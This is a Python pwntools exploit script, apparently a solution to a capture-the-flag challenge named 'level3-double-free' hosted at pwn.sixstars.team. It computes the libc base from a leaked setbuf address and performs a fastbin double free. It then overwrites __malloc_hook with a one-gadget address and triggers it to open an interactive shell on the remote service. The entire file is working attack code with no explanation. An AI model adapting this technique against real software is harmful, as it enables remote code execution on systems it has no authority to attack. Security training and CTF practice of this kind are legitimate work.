#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./level3-double-free', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
#gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))
#context.terminal = ['tmux', 'new-window']
#debug = lambda : gdb.attach(r) #, gdbscript='b *{:#x}'.format(code.address+0x10EE))

def add(data):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', data)
def dele(idx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(':', str(idx))
def exploit(r):
#    print r.pid
#    pause()

    r.recvuntil(':')
    tmp = int(r.recvline().strip(), 16)
    libc.address = tmp - libc.sym['setbuf']
    info('%016x libc.address', libc.address)
    add('aaa') # 0 
    add('bbb') # 1
    dele(0)
    dele(1)
    dele(0)
    add( p64(libc.sym['__malloc_hook']-19 ) )
    add('c'*8)
    add('c'*8)
    add('\x7f\0\0' + p64(libc.address + 0xf02a4))
    dele(0)

    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    elif len(sys.argv) > 1:
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        r = remote('pwn.sixstars.team', 22503)
        #r = code.process()
        libc = ELF('/dbg64/libc-amd64.so', checksec=False)
    else:
        r = remote('pwn.sixstars.team', 22503)
        #r = code.process()
        libc = code.libc if code.libc else ELF('./bc.so.6', checksec=False)
    print code, libc
    exploit(r)
